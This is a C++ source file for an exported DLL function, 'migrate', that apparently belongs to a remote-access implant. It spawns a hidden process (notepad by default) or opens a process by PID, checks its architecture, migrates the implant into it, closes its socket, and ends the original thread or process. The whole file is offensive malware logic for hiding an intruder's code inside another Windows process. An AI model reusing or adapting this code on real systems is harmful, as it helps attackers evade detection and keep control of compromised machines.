#include "../common/crt.h"
#include "../core/external.h"
#include "../config.h"

extern "C" __declspec(dllexport) void migrate(const char *arg)
{
    uint32_t pid = atoi(arg);

    if(pid == 0){
        sc_printf("launching notepad\n");
    
        PROCESS_INFORMATION proc_info;
        
        STARTUPINFO start_info;
        ZeroMemory(&start_info, sizeof(STARTUPINFO));
        
        start_info.cb = sizeof(STARTUPINFO);
        start_info.dwFlags = STARTF_USESHOWWINDOW;
        start_info.wShowWindow = SW_HIDE;
        
        char cmd[] = MIGPROC;
        
        CreateProcess(NULL,
                      cmd,
                      NULL,
                      NULL,
                      FALSE,
                      0,
                      NULL,
                      NULL,
                      &start_info,
                      &proc_info
                      );
        
        
        Next(GetProcessId(proc_info.hProcess), true);
        
        CloseHandle(proc_info.hProcess);
        CloseHandle(proc_info.hThread);
    }else{
        if(&IsWow64Process == NULL){
            sc_printf("IsWow64Process unsuported: migration unattempted\n");
            return;
        }
        
        BOOL bWow64;
        
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if(!hProc){
            sc_printf("unable to open process\n");
            return;
        }
        
        IsWow64Process(hProc, &bWow64);
        
        if(bWow64){
            sc_printf("process %d is wow64: unable to migrate\n", pid);
            CloseHandle(hProc);
            return;
        }
        
        CloseHandle(hProc);
    
        Next(pid, false);
    }
    
    if(Migrate()){
        sc_printf("unable to migrate into process %d\n", pid);
        return;
    }
    SockDisconnect();
    
    if(DllMeta.curr.kill)
        ExitProcess(0);
    else
        ExitThread(0);
}
